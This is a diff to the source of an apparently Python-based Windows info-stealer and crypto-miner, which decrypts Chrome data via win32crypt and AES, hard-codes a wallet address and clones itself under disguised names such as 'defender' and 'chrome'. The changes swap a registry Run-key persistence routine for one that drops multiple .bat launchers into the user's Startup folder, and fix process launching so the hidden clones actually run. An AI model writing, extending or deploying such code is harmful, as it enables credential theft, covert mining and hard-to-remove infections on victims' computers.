@@ -41,6 +41,10 @@ import win32crypt
 from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
+import winreg as reg
+import getpass
+import os
+USER_NAME = getpass.getuser()
 
 
 """
@@ -56,7 +60,7 @@ ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with y
 
 CLONE_PROCESS = True # Create Instances of the program hidden in multiple path.
 PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
-PROCESS_NUM = 3 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
+PROCESS_NUM = 4 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
 MINE = False #Mine crypto? True/False
 
@@ -123,7 +127,7 @@ if yes == "yes":
 		 return bool(match)
 	def launchProcesses(path):
 		try:
-			os.system("path")
+			os.system(path)
 		except Exception as e:
 			print("Err : "+ str(e))
 	if(CLONE_PROCESS == True):
@@ -159,38 +163,16 @@ if yes == "yes":
 		city = str(uuid.uuid4())
 		country = str(uuid.uuid4())
 
-
-	def AddToRegistry():
-		print("Adding to registry")
-		#Statup should be available soon for Mac OS
-		if os.name == "nt" or os.name == "windows":
-			import winreg as reg
-			pth = os.path.dirname(os.path.realpath(sys.argv[0]))
-			
-			# name of the python file with extension
-			s_name=os.path.basename(sys.argv[0])	
-			
-			# joins the file name to end of path address
-			address=os.path.join(pth,s_name)
-			
-			# key we want to change is HKEY_CURRENT_USER
-			# key value is Software\Microsoft\Windows\CurrentVersion\Run
-			key = reg.HKEY_CURRENT_USER
-			key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
-			
-			# open the key to make changes to
-			open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
-			
-			# modifiy the opened key
-			reg.SetValueEx(open,"WineDefender",0,reg.REG_SZ,address)
-			
-			# now close the opened key
-			reg.CloseKey(open)
-		else:
-			print("[.] Startup not available because os is Linux or mac.")
+	def add_to_startup(file_path=""):
+		 if file_path == "":
+			  file_path = os.path.dirname(os.path.realpath(__file__)) +"\\"+ sys.argv[0]
+		 bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+		 with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
+			  bat_file.write(r'start "" "%s"' % file_path)
 
 	if(platform.system() == 'windows' or platform.system() == "Windows"):
-		AddToRegistry()
+		for i in range(PROCESS_NUM):
+			add_to_startup()
 	def stealChromeWin():
 		try:
 			res =  """Stealed By 0xSxZ ------------> \n\n"""
